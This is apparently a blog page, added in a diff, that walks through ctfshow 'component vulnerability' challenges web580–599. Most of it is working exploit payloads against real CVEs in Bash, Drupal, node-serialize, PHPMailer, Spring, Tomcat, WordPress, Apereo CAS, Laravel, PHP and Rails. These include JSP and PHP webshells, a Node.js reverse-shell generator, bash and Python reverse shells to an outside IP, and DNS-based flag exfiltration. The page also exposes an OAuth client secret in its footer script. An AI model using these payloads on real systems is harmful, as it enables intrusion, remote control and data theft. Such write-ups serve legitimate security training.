@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[ctfshow]组件漏洞 | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1724150366542">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="web580
+根据提示发现Bash Shellshock 破壳漏洞（CVE-2014-6271）
+payload
+User-Agent:() { :; }; echo; /bin/cat /flag
+
+web581
+参考文章
+CVE-201..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1724150366542" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[ctfshow]组件漏洞</h2>
+            <div class="post-date">2024-08-14</div>
+            
+              <div class="feature-container" style="background-image: url('https://fallingskies22.github.io/post-images/ctfshowzu-jian-lou-dong.jpg')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="web580">web580</h2>
+<p>根据提示发现<a href="https://www.cnblogs.com/Cl0ud/p/14248937.html">Bash Shellshock 破壳漏洞（CVE-2014-6271）</a></p>
+<p>payload</p>
+<pre><code>User-Agent:() { :; }; echo; /bin/cat /flag
+</code></pre>
+<h2 id="web581">web581</h2>
+<p>参考文章<br>
+<a href="https://paper.seebug.org/334">CVE-2017-6920:Drupal远程代码执行漏洞分析及POC构造</a></p>
+<p>构造反序列化payload</p>
+<pre><code class="language-php">&lt;?php
+
+class log{
+    public $filename;
+    public $content;
+    public function __construct($n,$c){
+        $this-&gt;filename=$n;
+        $this-&gt;content=$c;
+    }
+    public function __destruct(){
+        file_put_contents($this-&gt;filename, $this-&gt;content);
+    }
+}
+
+echo(serialize(new log(&quot;/var/www/html/1.php&quot;,&quot;&lt;?php @eval(\$_POST[1])?&gt;&quot;)));
+</code></pre>
+<p>payload</p>
+<pre><code>content=!php/object O:3:&quot;log&quot;:2:{s:8:&quot;filename&quot;;s:19:&quot;/var/www/html/1.php&quot;;s:7:&quot;content&quot;;s:24:&quot;&lt;?php @eval($_POST[1])?&gt;&quot;;}
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://fallingskies22.github.io/post-images/1723632473882.png" alt="" loading="lazy"></figure>
+<h2 id="web582">web582</h2>
+<p>参考文章<a href="http://www.mi1k7ea.com/2020/03/29/node-serialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">node-serialize反序列化漏洞</a></p>
+<p>poc</p>
+<pre><code class="language-js">var y = {
+	poc : function(){
+		require('child_process').exec('env', function(error, stdout, stderr){ console.log(stdout) });
+	}
+}
+var s = require('node-serialize');
+console.log(&quot;Serialized:\n&quot; + s.serialize(y));
+</code></pre>
+<p>nodejs执行命令没有回显</p>
+<p>使用nodejsshell.py(需要python2环境)</p>
+<pre><code class="language-python">import sys
+
+if len(sys.argv) != 3:
+    print &quot;Usage: %s &lt;LHOST&gt; &lt;LPORT&gt;&quot; % (sys.argv[0])
+    sys.exit(0)
+
+IP_ADDR = sys.argv[1]
+PORT = sys.argv[2]
+
+
+def charencode(string):
+    &quot;&quot;&quot;String.CharCode&quot;&quot;&quot;
+    encoded = ''
+    for char in string:
+        encoded = encoded + &quot;,&quot; + str(ord(char))
+    return encoded[1:]
+
+print &quot;[+] LHOST = %s&quot; % (IP_ADDR)
+print &quot;[+] LPORT = %s&quot; % (PORT)
+NODEJS_REV_SHELL = '''
+var net = require('net');
+var spawn = require('child_process').spawn;
+HOST=&quot;%s&quot;;
+PORT=&quot;%s&quot;;
+TIMEOUT=&quot;5000&quot;;
+if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
+function c(HOST,PORT) {
+    var client = new net.Socket();
+    client.connect(PORT, HOST, function() {
+        var sh = spawn('/bin/sh',[]);
+        client.write(&quot;Connected!\\n&quot;);
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+        sh.on('exit',function(code,signal){
+          client.end(&quot;Disconnected!\\n&quot;);
+        });
+    });
+    client.on('error', function(e) {
+        setTimeout(c(HOST,PORT), TIMEOUT);
+    });
+}
+c(HOST,PORT);
+''' % (IP_ADDR, PORT)
+
+
+
+print &quot;[+] Encoding&quot;
+PAYLOAD = charencode(NODEJS_REV_SHELL)
+print &quot;eval(String.fromCharCode(%s))&quot; % (PAYLOAD)
+</code></pre>
+<p>将脚本生成payload加入下方<code>payload</code>处，需要在username参数最后手动添加括号</p>
+<pre><code>{&quot;username&quot;:&quot;_$$ND_FUNC$$_function(){payload}()&quot;,&quot;password&quot;:&quot;123&quot;}
+</code></pre>
+<p>base64编码后，发送<br>
+<img src="https://fallingskies22.github.io/post-images/1723655653934.png" alt="" loading="lazy"></p>
+<p>vps收到反弹shell，执行命令即可。</p>
+<h2 id="web583">web583</h2>
+<p>参考文章<a href="https://blog.chaitin.cn/phpmailer-cve-2016-10033/">PHPMailer 命令执行漏洞（CVE-2016-10033）分析</a></p>
+<p>主要是绕过对email正则的校验，然后利用空格注入sendmail的其他参数命令。</p>
+<p>payload</p>
+<pre><code>name=&lt;?php%20system('cat%20/flag_is_here');?&gt;&amp;email=&quot;aaa&quot;.%20-OQueueDirectory=/tmp/.%20-X/var/www/html/a.php%20@aaa.com&amp;message=qaz
+</code></pre>
+<h2 id="web584">web584</h2>
+<p>参考文章<a href="https://tech.meituan.com/2017/09/29/spring-data-rest-cve.html">Spring Data REST 远程代码执行漏洞（CVE-2017-8046）分析与复现</a></p>
+<p>使用post方法创建一个用户<br>
+<img src="https://fallingskies22.github.io/post-images/1723690551582.png" alt="" loading="lazy"></p>
+<p>使用patch方法修改内容，需要将Content-Type指定为application/json-patch+json<br>
+在path参数处注入SpEL表达式。</p>
+<p>反弹shell命令</p>
+<pre><code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1
+</code></pre>
+<p>使用脚本编码为bytecode</p>
+<pre><code>payload = b'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC9wb3J0IDA+JjE=}|{base64,-d}|{bash,-i}'
+bytecode = ','.join(str(i) for i in list(payload))
+print(bytecode)
+</code></pre>
+<p>payload</p>
+<pre><code>[{ &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,57,112,99,67,57,119,98,51,74,48,73,68,65,43,74,106,69,61,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125}))/lastname&quot;, &quot;value&quot;: &quot;ctfshow&quot; }]
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://fallingskies22.github.io/post-images/1723691633100.png" alt="" loading="lazy"></figure>
+<h2 id="web585">web585</h2>
+<p>参考文章Tomcat PUT方法任意写文件漏洞<a href="https://github.com/breaktoprotect/CVE-2017-12615">POC CVE-2017-12615</a></p>
+<p>传一个小马</p>
+<pre><code class="language-java">&lt;%
+    if(&quot;1&quot;.equals(request.getParameter(&quot;pwd&quot;))){
+        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;p&quot;)).getInputStream();
+        int a = -1;
+        byte[] b = new byte[2048];
+        out.print(&quot;&lt;pre&gt;&quot;);
+        while((a=in.read(b))!=-1){
+            out.print(new String(b));
+        }
+        out.print(&quot;&lt;/pre&gt;&quot;);
+    }
+%&gt;
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://fallingskies22.github.io/post-images/1723694547014.png" alt="" loading="lazy"></figure>
+<h2 id="web586">web586</h2>
+<p>参考<a href="https://www.exploit-db.com/exploits/39896">WordPress Plugin Double Opt-In for Download 2.0.9 - SQL Injection</a></p>
+<p>需要注册账号并登录。<br>
+使用<code>load_file</code>读取<code>/flag_is_here</code></p>
+<pre><code>/wp-admin/admin-ajax.php?action=populate_download_edit_form
+
+
+id=0 UNION SELECT 1, 2, 4, 5, 6, 7, load_file(0x2f666c61675f69735f68657265)
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://fallingskies22.github.io/post-images/1723716966943.png" alt="" loading="lazy"></figure>
+<h2 id="web587">web587</h2>
+<p>参考文章[weblogic 远程代码执行 <a href="https://blog.csdn.net/YouthBelief/article/details/121119954">CVE-2019-2725</a></p>
+<p>访问控制台页面<code>/console/login/LoginForm.jsp</code><br>
+发现版本为<code>10.3.6.0</code></p>
+<p>使用<a href="https://github.com/KimJun1010/WeblogicTool">工具</a>扫到存在<a href="https://www.cnblogs.com/backlion/p/8194324.html">CVE-2017-10271</a></p>
+<h2 id="web588">web588</h2>
+<p>weblogic版本为<code>12.2.1.3.0</code></p>
+<p>参考文章<a href="https://www.freebuf.com/vuls/325607.html">CVE-2018-2894漏洞复现</a></p>
+<p>利用上题工具执行<code>env</code></p>
+<h2 id="web589">web589</h2>
+<p>参考文章<a href="https://blog.csdn.net/m0_51683653/article/details/129240528">CVE-2016-3088 ActiveMQ任意文件写入漏洞</a><br>
+访问<code>/admin</code>路径<br>
+默认账户密码admin/admin 登录</p>
+<p>访问<code>/admin/test/systemProperties.jsp</code>获得web目录的绝对路径</p>
+<p>使用PUT方法上传小马<br>
+<img src="https://fallingskies22.github.io/post-images/1723722142544.png" alt="" loading="lazy"></p>
+<p>使用MOVE方法移动到web目录下<br>
+<img src="https://fallingskies22.github.io/post-images/1723722278587.png" alt="" loading="lazy"></p>
+<p>访问webshell</p>
+<pre><code>admin/1.jsp?pwd=1&amp;p=env
+</code></pre>
+<h2 id="web590">web590</h2>
+<p>参考文章<a href="https://github.com/vulhub/vulhub/blob/master/apereo-cas/4.1-rce/README.zh-cn.md">Apereo CAS 4.1 反序列化命令执行漏洞</a></p>
+<p>使用工具<a href="https://github.com/vulhub/Apereo-CAS-Attack">Apereo-CAS attack</a>生成payload</p>
+<p>使用反弹shell的方式</p>
+<pre><code>java -jar .\apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 &quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC9wb3J0IDA+JjE=}|{base64,-d}|{bash,-i}&quot;
+</code></pre>
+<p>将payload放在登录包中的execution参数中<br>
+<img src="https://fallingskies22.github.io/post-images/1723733265732.png" alt="" loading="lazy"></p>
+<h2 id="web591">web591</h2>
+<p>参考文章<a href="https://www.freebuf.com/vuls/270633.html">Apache HTTPD 换行解析漏洞分析与复现（CVE-2017-15715）</a></p>
+<p>文件上传处对文件名做了校验，使用%0a的方式绕过，详细分析看上面文章，不要直接换行，会变成<code>0x0d0x0a</code>，使用hex修改的方式在文件名最后添加<code>0x0a</code><br>
+<img src="https://fallingskies22.github.io/post-images/1723733981686.png" alt="" loading="lazy"></p>
+<h2 id="web592">web592</h2>
+<p>参考文章<a href="https://github.com/vulhub/vulhub/blob/master/httpd/apache_parsing_vulnerability/README.md">Apache HTTPD 多后缀解析漏洞</a></p>
+<p>上传文件名为<code>1.php.png</code><br>
+只要给.php后缀增加了处理器，在多个后缀情况下，只要含有<code>.php</code>后缀的文件即将被识别成PHP文件</p>
+<figure data-type="image" tabindex="5"><img src="https://fallingskies22.github.io/post-images/1723734648233.png" alt="" loading="lazy"></figure>
+<h2 id="web593">web593</h2>
+<p>参考文章<a href="https://zgao.top/apache-ssi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Apache SSI 远程命令执行漏洞复现</a></p>
+<p>上传shtml文件</p>
+<pre><code>&lt;!--#exec cmd=&quot;cat /flag&quot;--&gt;
+</code></pre>
+<p>访问即可执行命令。</p>
+<h2 id="web594">web594</h2>
+<p>参考文章<a href="https://www.anquanke.com/post/id/231459">CVE-2021-3129 Laravel Debug mode RCE 漏洞分析</a></p>
+<p>这个漏洞的利用过程还是挺精彩的，主要是利用伪协议清除无关数据干扰，写入phar文件的过程。</p>
+<p>生成反序列化payload的<a href="https://github.com/ambionics/phpggc">工具phpggc</a></p>
+<p>这里利用 Monolog 库的链，也可以用Laravel自带的链。</p>
+<p>使用其他人写好的<a href="https://github.com/zhzyker/CVE-2021-3129/tree/main">exp</a>,有问题可以自己修改下。😘</p>
+<h2 id="web595">web595</h2>
+<p>参考文章<a href="https://www.bilibili.com/read/cv10712219/">PHP zerodium后门漏洞</a></p>
+<pre><code>User-Agentt: zerodiumsystem('cat /flag');
+</code></pre>
+<h2 id="web596">web596</h2>
+<p>参考文章<a href="https://github.com/neargle/PIL-RCE-By-GhostButt">PIL-RCE-By-GhostButt</a></p>
+<p>这个漏洞还是很复杂，等有需要再慢慢分析。</p>
+<p>上传图片1.png，参考<a href="https://github.com/vulhub/vulhub/blob/master/python/PIL-CVE-2017-8291/poc.png">poc.png</a></p>
+<p><img src="https://fallingskies22.github.io/post-images/1723955493983.png" alt="" loading="lazy"><br>
+将payload处改为反弹shell</p>
+<pre><code class="language-sh">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;47.109.140.38&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)'
+</code></pre>
+<h2 id="web597">web597</h2>
+<p>参考文章<a href="https://github.com/vulhub/vulhub/blob/master/rails/CVE-2018-3760/README.zh-cn.md">Ruby On Rails 路径穿越漏洞（CVE-2018-3760）</a></p>
+<p>访问链接<code>/assets/file:%2f%2f/etc/passwd</code>获取允许的目录列表</p>
+<p>再使用<code>%252e%252e</code>向上一层跳转读取其他文件。</p>
+<pre><code>/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/flag
+</code></pre>
+<h2 id="web598">web598</h2>
+<p>参考文章<a href="https://github.com/cyberharsh/rails5418">Ruby on Rails 路径穿越与任意文件读取漏洞（CVE-2019-5418）</a></p>
+<pre><code>Accept: ../../../../../../../../flag{{
+</code></pre>
+<h2 id="web599">web599</h2>
+<p>参考文章<a href="https://github.com/Threekiii/Vulhub-Reproduce/blob/master/Ruby%20NetFTP%20%E6%A8%A1%E5%9D%97%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2017-17405.md">Ruby NetFTP 模块命令注入漏洞 CVE-2017-17405</a></p>
+<p>自己起一个ftp服务</p>
+<pre><code># 安装pyftpdlib
+pip install pyftpdlib
+
+# 在当前目录下启动一个ftp服务器，默认监听在`0.0.0.0:8080`端口
+python3 -m pyftpdlib -p 8080 -i 0.0.0.0
+</code></pre>
+<p>参考payload如下</p>
+<pre><code>GET /download?uri=ftp://ip:port/&amp;file=|ping${IFS}$FLAG.4d62192e-9edb-4352-9024-cb01ee487a23.dnshook.site${IFS}-c${IFS}5 HTTP/1.1
+</code></pre>
+<p>执行不了命令，不知道为啥。。。</p>
+<p>一开始以为是vps防火墙问题，全端口开放后依然无法顺利执行命令。。。</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/ctfshowzhong-qi-ce-ping/">
+                  <h3 class="post-title">
+                    [ctfshow]中期测评
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
